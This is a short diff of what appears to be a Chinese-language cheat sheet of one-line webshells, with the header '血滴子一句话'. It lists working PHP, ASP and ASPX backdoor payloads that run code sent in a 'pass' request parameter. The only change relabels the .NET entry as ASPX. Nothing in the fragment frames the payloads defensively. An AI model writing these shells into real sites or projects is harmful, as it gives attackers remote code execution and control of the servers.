@@ -127,4 +127,4 @@ www 根目录
 ####血滴子一句话
 PHP: <?php @eval($_POST['pass']);?>
 ASP: <%eval request("pass")%>
-.NET: <%@ Page Language="Jscript"%><%eval(Request.Item["pass"],"unsafe");%>
+ASPX: <%@ Page Language="Jscript"%><%eval(Request.Item["pass"],"unsafe");%>
